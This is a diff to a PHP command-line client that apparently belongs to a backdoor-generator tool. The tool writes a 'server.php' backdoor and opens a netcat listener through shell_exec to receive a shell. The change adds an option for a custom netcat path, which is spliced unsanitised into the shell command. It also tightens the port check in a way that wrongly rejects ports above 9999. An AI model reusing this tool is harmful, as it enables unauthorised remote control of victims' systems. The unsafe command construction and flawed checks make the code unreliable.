@@ -9,10 +9,13 @@ class Client
 {
   private static $rotas = [
     'ip' => [
-      '--host' => '-h',
+      '--host' => '-h'
     ],
     'port' => [
       '--port' => '-p'
+    ],
+    'dir' => [
+      '--diretorio' => '-d'
     ]
   ];
   private static $output;
@@ -38,7 +41,7 @@ class Client
         $init = trim(fgets(STDIN));
         if ($init == 'y')
         {
-          self::createSocket(self::$output['porta']);
+          self::createSocket(self::$output['porta'], self::$output['dir']);
         } else
         {
           echo "Comando inválido! \n";
@@ -61,7 +64,7 @@ class Client
 
         if ($now == '-n' or $now == '--now')
         {
-          self::createSocket(self::$output['porta']);
+          self::createSocket(self::$output['porta'], self::$output['dir']);
         } else
         {
           echo "Seu arquivo foi salvo como server.php! \n";
@@ -77,7 +80,7 @@ class Client
 
         if ($now == '-n' or $now == '--now')
         {
-          self::createSocket(self::$output['porta']);
+          self::createSocket(self::$output['porta'], self::$output['dir']);
         } else
         {
           echo "Seu arquivo foi salvo como server.php! \n";
@@ -87,10 +90,17 @@ class Client
     }
   }
 
-  private static function createSocket($porta)
+  private static function createSocket($porta, $diretorio)
   {
-    $cmd = 'start "PHP Shell" cmd /c "nc -l -p '.$porta.' -vv & pause"';
-    shell_exec($cmd);
+    if (isset($diretorio))
+    {
+      $cmd = 'start "PHP Shell" cmd /c "'.$diretorio.' -l -p '.$porta.' -vv & pause"';
+      shell_exec($cmd);
+    } else
+    {
+      $cmd = 'start "PHP Shell" cmd /c "nc -l -p '.$porta.' -vv & pause"';
+      shell_exec($cmd);
+    }
   }
 
   private static function makeBackdoor()
@@ -165,7 +175,14 @@ class Client
       {
         if ($valor == $key or $valor == $value)
         {
-          $port = (isset($argv[$chave+1]) and is_numeric($argv[$chave+1]) and strlen($argv[$chave+1]) < 6 and $argv[$chave+1] != 0) ? $argv[$chave+1] : null;
+          $port = (isset($argv[$chave+1]) and is_numeric($argv[$chave+1]) and strlen($argv[$chave+1]) < 5 and $argv[$chave+1] != 0) ? $argv[$chave+1] : null;
+        }
+      }
+      foreach (self::$rotas['dir'] as $caminho => $alter_caminho)
+      {
+        if ($valor == $caminho or $valor == $alter_caminho)
+        {
+          $directory = (isset($argv[$chave+1]) and substr_count($argv[$chave+1], '/') != 0 or substr_count($argv[$chave+1], "\\") != 0) ? $argv[$chave+1] : null ;
         }
       }
     }
@@ -181,10 +198,20 @@ class Client
         exit();
       } else
       {
-        return [
-          'ip' => $ip,
-          'porta' => $port
-        ];
+        if (is_null($directory))
+        {
+          return [
+            'ip' => $ip,
+            'porta' => $port
+          ];
+        } else
+        {
+          return [
+            'ip' => $ip,
+            'porta' => $port,
+            'dir' => $directory
+          ];
+        }
       }
     }
   }
